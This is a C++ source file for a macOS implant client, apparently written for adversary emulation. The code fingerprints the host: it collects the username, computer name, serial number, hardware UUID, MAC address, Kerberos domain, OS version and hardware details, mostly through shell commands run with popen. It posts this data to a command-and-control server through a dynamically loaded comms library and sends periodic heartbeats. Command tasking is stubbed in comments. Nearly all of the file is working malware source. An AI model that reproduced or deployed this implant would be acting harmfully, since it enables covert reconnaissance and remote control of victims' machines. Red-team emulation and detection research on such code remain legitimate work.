#include "ClientPP.hpp"

namespace client {
    const int RESP_BUFFER_SIZE = 4096;

    std::string executeCmd(std::string cmd) {
        FILE *fp;
        std::string output = "";
        char line[2048];

        fp = popen(cmd.c_str(), "r");
        if (fp == NULL) {
            std::cout << "[IMPLANT] Failed to run command" << std::endl;
        }

        while (fgets(line, sizeof(line), fp) != NULL) {
            output = output + line;
        }

        pclose(fp);

        return output;
    }

    std::string getPlatformExpertDeviceValue(std::string key) {
        CFStringRef value_ref;
        char buffer[64] = {0};
        std::string ret("");
        io_service_t platformExpert = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                            IOServiceMatching("IOPlatformExpertDevice"));
        CFStringRef key_cfstring = CFStringCreateWithCString(kCFAllocatorDefault, key.c_str(), kCFStringEncodingUTF8);
        if (platformExpert)
        {
            CFTypeRef value_cfstring = IORegistryEntryCreateCFProperty(platformExpert,
                                                                        key_cfstring,
                                                                        kCFAllocatorDefault, 0);
            if (value_cfstring) {
                value_ref = (CFStringRef)value_cfstring;
            }
            if (CFStringGetCString(value_ref, buffer, 64, kCFStringEncodingUTF8)) {
                ret = buffer;
            }

            IOObjectRelease(platformExpert);
        }
        return ret;
    }
}

bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
    bool completed_discovery = false;
    // if parameters are populated, just return true
    if (c->strClientID != "") {
        std::cout << "[IMPLANT] Client ID already populated as: " + c->strClientID << std::endl;
        return true;
    }

    // otherwise, perform discovery actions, send to C2 server, return true
    else {
        std::string os_info = "";

        os_info += c->pathProcess + "\n";
        ClientPP::createClientID(c);
        os_info += c->strClientID + "\n";

        // get system time to populate install time
        std::chrono::system_clock::time_point tp = std::chrono::system_clock::now();
        std::chrono::system_clock::duration duration = tp.time_since_epoch();
        c->installTime = duration.count() * std::chrono::system_clock::period::num / std::chrono::system_clock::period::den;
        os_info += std::to_string(c->installTime) + "\n";

        // getpwuid() -> pw_name
        struct passwd *pwd;
        std::string username;
        if ((pwd = getpwuid(geteuid())) != NULL)
            username = pwd->pw_name;
        os_info += username + "\n";

        // scutil --get ComputerName
        os_info += client::executeCmd("scutil --get ComputerName");

        // uname -m
        os_info += client::executeCmd("uname -m");

        // get domain name
        c->domain = client::executeCmd("klist 2>/dev/null | awk '/Principal/ {split($0,line,\"@\"); printf(\"%s\", line[2])}'");
        os_info += c->domain;

        // sw_vers
        os_info += client::executeCmd("sw_vers -productVersion");

        // system_profiler SPHardwareDataType 2>/dev/null | awk ...
        os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Processor / {split($0,line,\": \"); printf(\"%s\",line[2]);}'") + "\n";
        os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Memory/ {split($0,line, \": \"); printf(\"%s\", line[2]);}'") + "\n";

        // send POST request with data to C2
        std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()));

        completed_discovery = true;
    }

    return completed_discovery;
}

void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
    // heartbeat - send HTTP GET request to server
    std::string heartbeat = c->strClientID;
    std::vector<unsigned char> heartbeat_vector( heartbeat.begin(), heartbeat.end() );
    std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector);

    std::cout << "[IMPLANT] Response buffer contains: \n";
    for (auto i: response_vector) {
        std::cout << i;
    }
    std::cout << std::endl;

    // receive and decrypt instructions
    // execute instructions
    // encrypt instructions
    // return output - send HTTP POST request to server

    // sleep after execution
    std::this_thread::sleep_for(std::chrono::milliseconds(dwRandomTimeSleep));
}

void ClientPP::createClientID(ClientPP * c) {
    //  serial number - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformSerialNumber/ {split ($0, line, "\""); printf("%s", line[4]); }'
    std::string serial_number = client::getPlatformExpertDeviceValue("IOPlatformSerialNumber");

    //  hardware UUID - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ {split ($0, line, "\""); printf("%s", line[4]); }'
    std::string platform_uuid = client::getPlatformExpertDeviceValue("IOPlatformUUID");

    //  mac address - ifconfig en0 | awk '/ether/{print $2}'
    std::string mac_address = client::executeCmd("ifconfig en0 | awk '/ether/{print $2}'");
    mac_address = mac_address.substr(0, mac_address.size()-1);

    //  randomly generated UUID - uuidgen
    std::string random_uuid = client::executeCmd("uuidgen");
    random_uuid = random_uuid.substr(0, random_uuid.size() -1 );
    std::cout << "[IMPLANT] uuidgen returned: " + random_uuid << std::endl;

    std::string cmd = "echo " + serial_number + platform_uuid + mac_address + random_uuid + " | md5 | xxd -r -p | base64";

    std::string id_str = client::executeCmd(cmd);
    id_str = id_str.substr(0, id_str.size()-1);
    std::vector<unsigned char> id_vector(id_str.begin(), id_str.end());

    memcpy(c->clientID, &id_vector[0], sizeof(id_vector));
    c->strClientID = id_str;
}

std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data) {
    // set response_buffer and response_length to hold the HTTP response and size
    unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
    unsigned char* response_buffer_ptr = &response_buffer[0];
    int response_length = 0;
    int* response_length_ptr = &response_length;
    
    // loads CommsLib exported function that generates the HTTP request
    void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**))dlsym(dylib, "sendRequest");
    if (sendRequest == NULL) {
        std::cout << "[IMPLANT] unable to load libComms.dylib sendRequest" << std::endl;
        dlclose(dylib);
        return std::vector<unsigned char>();
    }

    // call CommsLib sendRequest and pass the pointers to the response_buffer and response_length for updating
    sendRequest(type.c_str(), data, &response_buffer_ptr, &response_length_ptr);

    return std::vector<unsigned char>(response_buffer, response_buffer + response_length);
}

ClientPP::~ClientPP() {
    dlclose(dylib);
}
